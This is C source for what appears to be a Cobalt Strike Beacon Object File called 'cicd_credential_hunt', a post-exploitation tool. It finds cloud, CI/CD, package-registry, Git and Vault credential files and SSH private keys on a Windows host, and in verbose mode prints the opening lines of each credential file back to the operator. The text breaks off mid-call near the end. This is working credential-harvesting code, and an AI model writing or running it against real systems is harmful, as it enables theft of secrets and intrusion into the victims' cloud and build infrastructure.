#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <stddef.h>
#include <stdint.h>

#ifndef DECLSPEC_IMPORT
#ifdef _WIN32
#define DECLSPEC_IMPORT __declspec(dllimport)
#else
#define DECLSPEC_IMPORT
#endif
#endif

#ifndef WINAPI
#ifdef _WIN32
#define WINAPI __stdcall
#else
#define WINAPI
#endif
#endif

#ifndef HANDLE
typedef void *HANDLE;
#endif
#ifndef DWORD
typedef unsigned long DWORD;
#endif
#ifndef BOOL
typedef int BOOL;
#endif
#ifndef LONG
typedef long LONG;
#endif
#ifndef BYTE
typedef unsigned char BYTE;
#endif
#ifndef LPVOID
typedef void *LPVOID;
#endif
#ifndef LPCVOID
typedef const void *LPCVOID;
#endif
#ifndef LPCWSTR
typedef const unsigned short *LPCWSTR;
#endif
#ifndef LPWSTR
typedef unsigned short *LPWSTR;
#endif
#ifndef LPDWORD
typedef DWORD *LPDWORD;
#endif

#ifndef _WCHAR_T_DEFINED
typedef unsigned short wchar_t;
#define _WCHAR_T_DEFINED
#endif

#include "beacon.h"

#define INVALID_HANDLE_VALUE ((HANDLE)(long long)-1)
#define INVALID_FILE_ATTRIBUTES ((DWORD)0xFFFFFFFF)
#define FILE_ATTRIBUTE_DIRECTORY 0x00000010
#define OPEN_EXISTING 3
#define GENERIC_READ 0x80000000
#define FILE_SHARE_READ 0x00000001
#define FILE_SHARE_WRITE 0x00000002
#define FILE_SHARE_DELETE 0x00000004
#define MEM_COMMIT 0x00001000
#define MEM_RESERVE 0x00002000
#define MEM_RELEASE 0x00008000
#define PAGE_READWRITE 0x04

#define MAX_PATH_LEN 520
#define PREVIEW_READ_MAX 640
#define PREVIEW_LINES_MAX 3
#define PREVIEW_LINE_MAX 128
#define SSH_HEADER_READ_MAX 192
#define MAX_PEM_HITS 8
#define MAX_CACHE_HITS 8
#define ARTIFACT_CREDENTIAL 0
#define ARTIFACT_CONFIG 1

typedef struct {
    int verbose;
} hunt_opts_t;

typedef struct {
    DWORD dwLowDateTime;
    DWORD dwHighDateTime;
} FILETIME;

typedef struct {
    DWORD dwFileAttributes;
    FILETIME ftCreationTime;
    FILETIME ftLastAccessTime;
    FILETIME ftLastWriteTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
} WIN32_FILE_ATTRIBUTE_DATA;

typedef struct {
    DWORD dwFileAttributes;
    DWORD ftCreationTime_dwLowDateTime;
    DWORD ftCreationTime_dwHighDateTime;
    DWORD ftLastAccessTime_dwLowDateTime;
    DWORD ftLastAccessTime_dwHighDateTime;
    DWORD ftLastWriteTime_dwLowDateTime;
    DWORD ftLastWriteTime_dwHighDateTime;
    DWORD nFileSizeHigh;
    DWORD nFileSizeLow;
    DWORD dwReserved0;
    DWORD dwReserved1;
    wchar_t cFileName[260];
    wchar_t cAlternateFileName[14];
} WIN32_FIND_DATAW;

typedef struct {
    int credential_hits;
    int config_hits;
    int ssh_key_hits;
    int previewed_files;
    int preview_errors;
    int skipped_large;
    int truncated_previews;
} scan_results_t;

typedef struct {
    wchar_t root[MAX_PATH_LEN];
    wchar_t candidate[MAX_PATH_LEN];
    WIN32_FIND_DATAW find_data;
} path_enum_scratch_t;

DECLSPEC_IMPORT DWORD WINAPI KERNEL32$ExpandEnvironmentStringsW(LPCWSTR lpSrc, LPWSTR lpDst, DWORD nSize);
DECLSPEC_IMPORT DWORD WINAPI KERNEL32$GetFileAttributesW(LPCWSTR lpFileName);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$GetFileAttributesExW(LPCWSTR lpFileName, int fInfoLevelId, LPVOID lpFileInformation);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$FindFirstFileW(LPCWSTR lpFileName, WIN32_FIND_DATAW *lpFindFileData);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FindNextFileW(HANDLE hFindFile, WIN32_FIND_DATAW *lpFindFileData);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$FindClose(HANDLE hFindFile);
DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPVOID lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$ReadFile(HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPVOID lpOverlapped);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
DECLSPEC_IMPORT LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID lpAddress, size_t dwSize, DWORD flAllocationType, DWORD flProtect);
DECLSPEC_IMPORT BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, size_t dwSize, DWORD dwFreeType);

static void *inline_memset(void *dest, int val, size_t count) {
    unsigned char *d = (unsigned char *)dest;
    while (count--) {
        *d++ = (unsigned char)val;
    }
    return dest;
}

static void secure_virtual_free(void *buffer, size_t buffer_size) {
    if (!buffer) {
        return;
    }
    inline_memset(buffer, 0, buffer_size);
    KERNEL32$VirtualFree(buffer, 0, MEM_RELEASE);
}

static size_t wide_len(const wchar_t *s) {
    size_t i = 0;
    if (!s) {
        return 0;
    }
    while (s[i]) {
        i++;
    }
    return i;
}

static size_t ascii_len(const char *s) {
    size_t i = 0;
    if (!s) {
        return 0;
    }
    while (s[i]) {
        i++;
    }
    return i;
}

static int ascii_tolower(int c) {
    if (c >= 'A' && c <= 'Z') {
        return c + 32;
    }
    return c;
}

static int arg_equals_literal_i(const char *arg, int arg_len, const char *literal) {
    int start = 0;
    int end;
    size_t lit_len = 0;
    size_t i;
    if (!arg || arg_len <= 0 || !literal) {
        return 0;
    }
    end = arg_len;
    while (end > 0 && arg[end - 1] == '\0') {
        end--;
    }
    while (start < end && (arg[start] == ' ' || arg[start] == '\t' || arg[start] == '\r' || arg[start] == '\n')) {
        start++;
    }
    while (end > start && (arg[end - 1] == ' ' || arg[end - 1] == '\t' || arg[end - 1] == '\r' || arg[end - 1] == '\n')) {
        end--;
    }
    while (literal[lit_len]) {
        lit_len++;
    }
    if ((size_t)(end - start) != lit_len) {
        return 0;
    }
    for (i = 0; i < lit_len; i++) {
        if (ascii_tolower((unsigned char)arg[start + (int)i]) != ascii_tolower((unsigned char)literal[i])) {
            return 0;
        }
    }
    return 1;
}

static void print_usage(void) {
    BeaconPrintf(
        CALLBACK_OUTPUT,
        "[-] Usage: cicd_credential_hunt [-verbose|verbose]\n"
    );
}

static int parse_hunt_opts(datap *parser, hunt_opts_t *opts) {
    int arg_len = 0;
    char *arg;
    if (!parser || !opts) {
        return 0;
    }
    opts->verbose = 0;
    if (BeaconDataLength(parser) <= 0) {
        return 1;
    }
    arg = BeaconDataExtract(parser, &arg_len);
    if (!arg || arg_len <= 0) {
        return 1;
    }
    if (arg_equals_literal_i(arg, arg_len, "-verbose") || arg_equals_literal_i(arg, arg_len, "verbose")) {
        opts->verbose = 1;
    } else {
        print_usage();
        return 0;
    }
    if (BeaconDataLength(parser) > 0) {
        print_usage();
        return 0;
    }
    return 1;
}

static void print_hunt_banner(const hunt_opts_t *opts) {
    if (!opts) {
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[i] Enumerating CI/CD credential artifacts on Windows developer paths\n");
    if (opts->verbose) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Mode: verbose (bounded reads)\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] Mode: presence (existence only)\n");
    }
}

static int ascii_contains_ci_n(const char *hay, size_t hay_len, const char *needle) {
    size_t needle_len = 0;
    size_t i;
    if (!hay || !needle) {
        return 0;
    }
    while (needle[needle_len]) {
        needle_len++;
    }
    if (needle_len == 0 || needle_len > hay_len) {
        return 0;
    }
    for (i = 0; i + needle_len <= hay_len; i++) {
        size_t j = 0;
        while (j < needle_len &&
               ascii_tolower((unsigned char)hay[i + j]) == ascii_tolower((unsigned char)needle[j])) {
            j++;
        }
        if (j == needle_len) {
            return 1;
        }
    }
    return 0;
}

static int wide_equals_ci(const wchar_t *left, const wchar_t *right) {
    size_t i = 0;
    if (!left || !right) {
        return 0;
    }
    while (left[i] && right[i]) {
        wchar_t lc = left[i];
        wchar_t rc = right[i];
        if (lc >= L'A' && lc <= L'Z') {
            lc = (wchar_t)(lc + 32);
        }
        if (rc >= L'A' && rc <= L'Z') {
            rc = (wchar_t)(rc + 32);
        }
        if (lc != rc) {
            return 0;
        }
        i++;
    }
    return left[i] == right[i];
}

static int wide_ends_with_ci(const wchar_t *value, const wchar_t *suffix) {
    size_t value_len;
    size_t suffix_len;
    size_t offset;
    if (!value || !suffix) {
        return 0;
    }
    value_len = wide_len(value);
    suffix_len = wide_len(suffix);
    if (suffix_len == 0 || suffix_len > value_len) {
        return 0;
    }
    offset = value_len - suffix_len;
    return wide_equals_ci(value + offset, suffix);
}

static int append_component(const wchar_t *base, const wchar_t *name, wchar_t *out, size_t out_size) {
    size_t idx = 0;
    size_t i = 0;
    if (!base || !name || !out || out_size == 0) {
        return 0;
    }
    while (base[i] && idx + 1 < out_size) {
        out[idx++] = base[i++];
    }
    if (idx > 0 && out[idx - 1] != L'\\' && out[idx - 1] != L'/' && idx + 1 < out_size) {
        out[idx++] = L'\\';
    }
    i = 0;
    while (name[i] && idx + 1 < out_size) {
        out[idx++] = name[i++];
    }
    out[idx] = L'\0';
    return name[i] == L'\0';
}

static int expand_env_path(const wchar_t *pattern, wchar_t *expanded, size_t expanded_len) {
    DWORD result;
    if (!pattern || !expanded || expanded_len == 0) {
        return 0;
    }
    result = KERNEL32$ExpandEnvironmentStringsW(pattern, expanded, (DWORD)expanded_len);
    if (result == 0 || result > expanded_len) {
        if (expanded_len > 0) {
            expanded[0] = L'\0';
        }
        return 0;
    }
    return 1;
}

static int path_exists(LPCWSTR path) {
    DWORD attrs;
    if (!path) {
        return 0;
    }
    attrs = KERNEL32$GetFileAttributesW(path);
    return attrs != INVALID_FILE_ATTRIBUTES;
}

static int is_directory_path(LPCWSTR path) {
    DWORD attrs;
    if (!path) {
        return 0;
    }
    attrs = KERNEL32$GetFileAttributesW(path);
    if (attrs == INVALID_FILE_ATTRIBUTES) {
        return 0;
    }
    return (attrs & FILE_ATTRIBUTE_DIRECTORY) != 0;
}

static int get_file_size_low(LPCWSTR path, DWORD *size_low, DWORD *size_high) {
    WIN32_FILE_ATTRIBUTE_DATA data;
    if (!path || !size_low || !size_high) {
        return 0;
    }
    inline_memset(&data, 0, sizeof(data));
    if (!KERNEL32$GetFileAttributesExW(path, 0, &data)) {
        return 0;
    }
    *size_low = data.nFileSizeLow;
    *size_high = data.nFileSizeHigh;
    return 1;
}

static void sanitize_line(char *line, size_t len) {
    size_t i;
    for (i = 0; i < len; i++) {
        unsigned char c = (unsigned char)line[i];
        if (c == '\0') {
            break;
        }
        if (c == '\t') {
            line[i] = ' ';
            continue;
        }
        if (c < 32 || c > 126) {
            line[i] = '.';
        }
    }
}

static int line_has_visible_chars(const char *line) {
    size_t i = 0;
    if (!line) {
        return 0;
    }
    while (line[i]) {
        if (line[i] != ' ' && line[i] != '\t' && line[i] != '.') {
            return 1;
        }
        i++;
    }
    return 0;
}

static int read_file_prefix(LPCWSTR path, char *buffer, DWORD to_read, DWORD *bytes_read, scan_results_t *results) {
    HANDLE hFile;
    DWORD local_read = 0;
    if (!path || !buffer || !bytes_read) {
        return 0;
    }
    hFile = KERNEL32$CreateFileW(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        if (results) {
            results->preview_errors++;
        }
        return 0;
    }
    if (!KERNEL32$ReadFile(hFile, buffer, to_read, &local_read, NULL)) {
        KERNEL32$CloseHandle(hFile);
        if (results) {
            results->preview_errors++;
        }
        return 0;
    }
    KERNEL32$CloseHandle(hFile);
    *bytes_read = local_read;
    return 1;
}

static void print_preview_lines(const char *label, const char *buffer, DWORD bytes_read, DWORD file_size_low, scan_results_t *results) {
    DWORD i = 0;
    int lines = 0;
    int truncated = 0;
    char line[PREVIEW_LINE_MAX];
    int line_len = 0;
    int emitted_any = 0;
    if (label) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   %s:\n", (char *)label);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Preview:\n");
    }
    inline_memset(line, 0, sizeof(line));
    while (i < bytes_read && lines < PREVIEW_LINES_MAX) {
        char c = buffer[i++];
        if (c == '\r') {
            continue;
        }
        if (c == '\n') {
            if (line_len > 0) {
                line[line_len] = '\0';
                sanitize_line(line, (size_t)line_len);
                if (line_has_visible_chars(line)) {
                    BeaconPrintf(CALLBACK_OUTPUT, "[i]     %s\n", line);
                    lines++;
                    emitted_any = 1;
                }
            }
            line_len = 0;
            inline_memset(line, 0, sizeof(line));
            continue;
        }
        if (line_len + 1 < PREVIEW_LINE_MAX) {
            line[line_len++] = c;
        } else {
            truncated = 1;
        }
    }
    if (line_len > 0 && lines < PREVIEW_LINES_MAX) {
        line[line_len] = '\0';
        sanitize_line(line, (size_t)line_len);
        if (line_has_visible_chars(line)) {
            BeaconPrintf(CALLBACK_OUTPUT, "[i]     %s\n", line);
            lines++;
            emitted_any = 1;
        }
    }
    if (!emitted_any) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]     <no previewable text>\n");
    }
    if (file_size_low > bytes_read || i < bytes_read || lines >= PREVIEW_LINES_MAX || truncated) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Preview truncated\n");
        if (results) {
            results->truncated_previews++;
        }
    }
}

static void print_matching_lines(const char *heading, const char *buffer, DWORD bytes_read) {
    DWORD i = 0;
    int matches = 0;
    char line[PREVIEW_LINE_MAX];
    int line_len = 0;
    while (i < bytes_read && matches < 3) {
        char c = buffer[i++];
        if (c == '\r') {
            continue;
        }
        if (c == '\n') {
            if (line_len > 0) {
                line[line_len] = '\0';
                sanitize_line(line, (size_t)line_len);
                if (ascii_contains_ci_n(line, ascii_len(line), "credential") ||
                    ascii_contains_ci_n(line, ascii_len(line), "helper")) {
                    if (matches == 0) {
                        BeaconPrintf(CALLBACK_OUTPUT, "[i]   %s:\n", (char *)heading);
                    }
                    BeaconPrintf(CALLBACK_OUTPUT, "[+]     %s\n", line);
                    matches++;
                }
            }
            line_len = 0;
            inline_memset(line, 0, sizeof(line));
            continue;
        }
        if (line_len + 1 < PREVIEW_LINE_MAX) {
            line[line_len++] = c;
        }
    }
    if (line_len > 0 && matches < 3) {
        line[line_len] = '\0';
        sanitize_line(line, (size_t)line_len);
        if (ascii_contains_ci_n(line, ascii_len(line), "credential") ||
            ascii_contains_ci_n(line, ascii_len(line), "helper")) {
            if (matches == 0) {
                BeaconPrintf(CALLBACK_OUTPUT, "[i]   %s:\n", (char *)heading);
            }
            BeaconPrintf(CALLBACK_OUTPUT, "[+]     %s\n", line);
        }
    }
}

static void preview_text_file(const wchar_t *label, LPCWSTR path, DWORD size_low, scan_results_t *results, int highlight_gitconfig) {
    char *buffer;
    DWORD bytes_read = 0;
    buffer = (char *)KERNEL32$VirtualAlloc(NULL, PREVIEW_READ_MAX + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        results->preview_errors++;
        return;
    }
    inline_memset(buffer, 0, PREVIEW_READ_MAX + 1);
    if (!read_file_prefix(path, buffer, PREVIEW_READ_MAX, &bytes_read, results)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Preview unavailable: %S\n", path);
        secure_virtual_free(buffer, PREVIEW_READ_MAX + 1);
        return;
    }
    results->previewed_files++;
    print_preview_lines("Preview", buffer, bytes_read, size_low, results);
    if (highlight_gitconfig) {
        print_matching_lines("Credential helper hints", buffer, bytes_read);
    }
    secure_virtual_free(buffer, PREVIEW_READ_MAX + 1);
    (void)label;
}

static void inspect_text_artifact(const wchar_t *label, const wchar_t *expanded_path, scan_results_t *results, int class_id, int highlight_gitconfig, int verbose) {
    DWORD size_low = 0;
    DWORD size_high = 0;
    if (!path_exists(expanded_path) || is_directory_path(expanded_path)) {
        return;
    }
    if (class_id == ARTIFACT_CONFIG) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i] %S: %S\n", label, expanded_path);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %S: %S\n", label, expanded_path);
    }
    if (!get_file_size_low(expanded_path, &size_low, &size_high)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: unavailable\n");
    } else if (size_high != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: >4GB\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: %lu bytes\n", (unsigned long)size_low);
    }
    if (class_id == ARTIFACT_CONFIG) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Classification: configuration (not a credential artifact)\n");
    }
    if (verbose) {
        preview_text_file(label, expanded_path, size_low, results, highlight_gitconfig);
    }
    if (class_id == ARTIFACT_CREDENTIAL) {
        results->credential_hits++;
    } else if (class_id == ARTIFACT_CONFIG) {
        results->config_hits++;
    }
}

static void inspect_env_text(const wchar_t *pattern, const wchar_t *label, wchar_t *path, size_t path_len, scan_results_t *results, int class_id, int highlight_gitconfig, int verbose) {
    if (!pattern || !label || !path || path_len == 0) {
        return;
    }
    inline_memset(path, 0, path_len * sizeof(wchar_t));
    if (expand_env_path(pattern, path, path_len)) {
        inspect_text_artifact(label, path, results, class_id, highlight_gitconfig, verbose);
    }
}

static void inspect_cache_directory(const wchar_t *label, const wchar_t *dir_pattern, const wchar_t *file_glob, scan_results_t *results, int verbose) {
    path_enum_scratch_t *scratch;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    int hits = 0;
    if (!label || !dir_pattern || !file_glob || !results) {
        return;
    }
    scratch = (path_enum_scratch_t *)KERNEL32$VirtualAlloc(NULL, sizeof(path_enum_scratch_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!scratch) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] %S discovery unavailable: insufficient memory\n", label);
        return;
    }
    inline_memset(scratch, 0, sizeof(path_enum_scratch_t));
    if (!expand_env_path(dir_pattern, scratch->root, MAX_PATH_LEN)) {
        goto cleanup;
    }
    if (!is_directory_path(scratch->root)) {
        goto cleanup;
    }
    if (!append_component(scratch->root, file_glob, scratch->candidate, MAX_PATH_LEN)) {
        goto cleanup;
    }
    hFind = KERNEL32$FindFirstFileW(scratch->candidate, &scratch->find_data);
    if (hFind == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %S: %S\n", label, scratch->root);
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: directory (0 files)\n");
        results->credential_hits++;
        goto cleanup;
    }
    do {
        if ((scratch->find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) {
            continue;
        }
        if (hits >= MAX_CACHE_HITS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Additional %S files skipped after %d hits\n", label, MAX_CACHE_HITS);
            break;
        }
        if (append_component(scratch->root, scratch->find_data.cFileName, scratch->candidate, MAX_PATH_LEN)) {
            inspect_text_artifact(label, scratch->candidate, results, ARTIFACT_CREDENTIAL, 0, verbose);
            hits++;
        }
    } while (KERNEL32$FindNextFileW(hFind, &scratch->find_data));
    if (hits == 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] %S: %S\n", label, scratch->root);
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: directory (0 files)\n");
        results->credential_hits++;
    }
cleanup:
    if (hFind != INVALID_HANDLE_VALUE) {
        KERNEL32$FindClose(hFind);
    }
    secure_virtual_free(scratch, sizeof(path_enum_scratch_t));
}

static void inspect_private_key(const wchar_t *label, LPCWSTR path, scan_results_t *results, int verbose) {
    char *buffer;
    DWORD size_low = 0;
    DWORD size_high = 0;
    DWORD bytes_read = 0;
    char header[PREVIEW_LINE_MAX];
    int header_len = 0;
    DWORD i = 0;
    int has_header = 0;
    if (!path_exists(path) || is_directory_path(path)) {
        return;
    }
    get_file_size_low(path, &size_low, &size_high);
    BeaconPrintf(CALLBACK_OUTPUT, "[+] %S: %S\n", label, path);
    if (size_high != 0) {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: >4GB\n");
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[i]   Size: %lu bytes\n", (unsigned long)size_low);
    }
    if (!verbose) {
        results->ssh_key_hits++;
        return;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "[!] Private key candidate discovered; key body is intentionally not printed\n");
    buffer = (char *)KERNEL32$VirtualAlloc(NULL, SSH_HEADER_READ_MAX + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buffer) {
        results->preview_errors++;
        results->ssh_key_hits++;
        return;
    }
    inline_memset(buffer, 0, SSH_HEADER_READ_MAX + 1);
    if (read_file_prefix(path, buffer, SSH_HEADER_READ_MAX, &bytes_read, results)) {
        inline_memset(header, 0, sizeof(header));
        while (i < bytes_read && buffer[i] != '\n' && buffer[i] != '\r' && header_len + 1 < PREVIEW_LINE_MAX) {
            header[header_len++] = buffer[i++];
        }
        header[header_len] = '\0';
        sanitize_line(header, (size_t)header_len);
        if (ascii_contains_ci_n(header, ascii_len(header), "-----BEGIN ") ||
            ascii_contains_ci_n(header, ascii_len(header), "OPENSSH PRIVATE KEY") ||
            ascii_contains_ci_n(buffer, bytes_read, "openssh-key-v1")) {
            has_header = 1;
        }
        if (has_header && header_len > 0) {
            BeaconPrintf(CALLBACK_OUTPUT, "[i]   Header: %s\n", header);
        }
    } else {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Header preview unavailable: %S\n", path);
    }
    secure_virtual_free(buffer, SSH_HEADER_READ_MAX + 1);
    results->ssh_key_hits++;
}

static void inspect_fixed_patterns(scan_results_t *results, int verbose) {
    wchar_t *path;
    path = (wchar_t *)KERNEL32$VirtualAlloc(NULL, MAX_PATH_LEN * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!path) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] Credential artifact discovery unavailable: insufficient memory\n");
        return;
    }
    inline_memset(path, 0, MAX_PATH_LEN * sizeof(wchar_t));

    inspect_env_text(L"%USERPROFILE%\\.aws\\credentials", L"AWS credentials", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.aws\\config", L"AWS config", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_cache_directory(L"AWS CLI cache", L"%USERPROFILE%\\.aws\\cli\\cache", L"*", results, verbose);
    inspect_env_text(L"%APPDATA%\\gcloud\\application_default_credentials.json", L"GCP ADC", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.config\\gcloud\\application_default_credentials.json", L"GCP ADC", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);

    inspect_env_text(L"%USERPROFILE%\\.kube\\config", L"Kubeconfig", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%APPDATA%\\terraform.d\\credentials.tfrc.json", L"Terraform credentials", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.terraform.d\\credentials.tfrc.json", L"Terraform credentials", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);

    inspect_env_text(L"%APPDATA%\\GitHub CLI\\hosts.yml", L"GitHub CLI auth", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%APPDATA%\\glab-cli\\config.yml", L"GitLab CLI auth", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.config\\glab-cli\\config.yml", L"GitLab CLI auth", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);

    inspect_env_text(L"%USERPROFILE%\\.npmrc", L"npm config", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.pypirc", L"PyPI config", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.docker\\config.json", L"Docker config", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.cargo\\credentials.toml", L"Cargo credentials", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.cargo\\credentials", L"Cargo credentials (legacy)", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.m2\\settings.xml", L"Maven settings", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.gradle\\gradle.properties", L"Gradle properties", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.gem\\credentials", L"RubyGems credentials", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);

    inspect_env_text(L"%USERPROFILE%\\.git-credentials", L"Git credential store", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.gitconfig", L"Git config", path, MAX_PATH_LEN, results, ARTIFACT_CONFIG, 1, verbose);

    inspect_env_text(L"%USERPROFILE%\\.netrc", L"Netrc", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\_netrc", L"Netrc (Windows)", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.config\\containers\\auth.json", L"Containers auth", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);
    inspect_env_text(L"%USERPROFILE%\\.vault-token", L"Vault token", path, MAX_PATH_LEN, results, ARTIFACT_CREDENTIAL, 0, verbose);

    secure_virtual_free(path, MAX_PATH_LEN * sizeof(wchar_t));
}

static void inspect_ssh_artifacts(scan_results_t *results, int verbose) {
    path_enum_scratch_t *scratch;
    HANDLE hFind = INVALID_HANDLE_VALUE;
    int pem_hits = 0;
    scratch = (path_enum_scratch_t *)KERNEL32$VirtualAlloc(NULL, sizeof(path_enum_scratch_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!scratch) {
        BeaconPrintf(CALLBACK_OUTPUT, "[-] SSH artifact discovery unavailable: insufficient memory\n");
        return;
    }
    inline_memset(scratch, 0, sizeof(path_enum_scratch_t));
    if (!expand_env_path(L"%USERPROFILE%\\.ssh", scratch->root, MAX_PATH_LEN)) {
        goto cleanup;
    }
    if (!is_directory_path(scratch->root)) {
        goto cleanup;
    }
    if (append_component(scratch->root, L"config", scratch->candidate, MAX_PATH_LEN)) {
        inspect_text_artifact(L"SSH config", scratch->candidate, results, ARTIFACT_CONFIG, 0, verbose);
    }
    if (append_component(scratch->root, L"id_rsa", scratch->candidate, MAX_PATH_LEN)) {
        inspect_private_key(L"SSH private key", scratch->candidate, results, verbose);
    }
    if (append_component(scratch->root, L"id_ed25519", scratch->candidate, MAX_PATH_LEN)) {
        inspect_private_key(L"SSH private key", scratch->candidate, results, verbose);
    }
    if (append_component(scratch->root, L"id_ecdsa", scratch->candidate, MAX_PATH_LEN)) {
        inspect_private_key(L"SSH private key", scratch->candidate, results, verbose);
    }
    if (append_component(scratch->root, L"identity", scratch->candidate, MAX_PATH_LEN)) {
        inspect_private_key(L"SSH private key", scratch->candidate, results, verbose);
    }
    if (!append_component(scratch->root, L"*.pem", scratch->candidate, MAX_PATH_LEN)) {
        goto cleanup;
    }
    hFind = KERNEL32$FindFirstFileW(scratch->candidate, &scratch->find_data);
    if (hFind == INVALID_HANDLE_VALUE) {
        goto cleanup;
    }
    do {
        if ((scratch->find_data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0) {
            continue;
        }
        if (wide_ends_with_ci(scratch->find_data.cFileName, L".pub")) {
            continue;
        }
        if (pem_hits >= MAX_PEM_HITS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[!] Additional .pem files skipped after %d hits\n", MAX_PEM_HITS);
            break;
        }
        if (append_component(scratch->root, scratch->find_data.cFileName, scratch->candidate, MAX_PATH_LEN)) {
            inspect_private_key(L"SSH PEM candidate", scratch->candidate, results, verbose);
            pem_hits++;
        }
    } while (KERNEL32$FindNextFileW(hFind, &scratch->find_data));
cleanup:
    if (hFind != INVALID_HANDLE_VALUE) {
        KERNEL32$FindClose(hFind);
    }
    secure_virtual_free(scratch, sizeof(path_enum_scratch_t));
}

void go(char *args, unsigned long alen) {
    datap parser = {0};
    scan_results_t results;
    hunt_opts_t opts;
    if (alen > 0) {
        BeaconDataParse(&parser, args, (int)alen);
    }
    inline_memset(&results, 0, sizeof(results));
    inline_memset(&opts, 0, sizeof(opts));
    if (!parse_hunt_opts(&parser, &opts)) {
        return;
    }
    print_hunt_banner(&opts);
    inspect_fixed_patterns(&results, opts.verbose);
    inspect_ssh_artifacts(&results, opts.verbose);
    BeaconPrintf(
        CALLBACK_OUTPUT,
